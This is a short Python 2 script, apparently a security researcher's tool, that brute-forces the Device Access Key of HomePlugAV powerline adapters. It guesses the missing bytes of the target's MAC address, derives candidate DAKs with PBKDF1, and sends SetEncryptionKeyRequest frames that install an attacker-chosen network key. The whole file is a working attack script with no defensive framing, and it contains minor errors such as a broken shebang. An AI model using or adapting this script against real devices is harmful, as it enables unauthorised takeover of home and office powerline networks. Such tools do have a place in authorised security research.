#!/usr/bin/en python2

"""
    Copyright (C) Quick'n'dirty DAK bruteforcer for HomePlugAV PLCs by FlUxIuS (Sebastien Dudek)
"""

import sys
import binascii
import itertools
from layerscapy.HomePlugAV import *
from PBKDF1 import *
from genDAK import *
from optparse import OptionParser

if __name__ == "__main__":
    usage = "usage: %prog [options] arg"
    parser = OptionParser(usage)
    parser.add_option("-i", "--iface", dest="iface", default="eth0",
        help="select an interface to Enable sniff mode and sniff indicates packets", metavar="INTERFACE")
    parser.add_option("-t", "--targets", dest="macaddress", default="",
        help="Targets MAC address bytes", metavar="MACBYTES")
    parser.add_option("-s", "--source", dest="sourcemac", default="00:c4:ff:ee:00:00",
        help="source MAC address to use", metavar="SOURCEMARC")
    parser.add_option("-k", "--key", dest="nmk", default="\x00"*16,
        help="NMK key to configure", metavar="NMK")


    (options, args) = parser.parse_args()
    arg = options.macaddress
    _bytes = [hex(x)[2:] for x in (range(0x100))]
    products = itertools.product(_bytes, repeat=(6-len(arg)/2))

    for x in products:
        cmac = '' 
        for y in range(len(x)):
            if len(x[y]) == 1:
                cmac += '0'+ x[y]
            else:
                cmac += x[y]
        newmac = arg + cmac
        keygen = DAKgen(newmac)
        DAKpass = keygen.generate()
        pbkdf1 = PBKDF1(DAKpass, DAK_SALT, 16, hashlib.sha256())    
        pkt = Ether(src=options.sourcemac)/HomePlugAV()/SetEncryptionKeyRequest(NMK=options.nmk, EKS=1, DAK=binascii.unhexlify(pbkdf1))
        sendp(pkt, iface=options.iface)
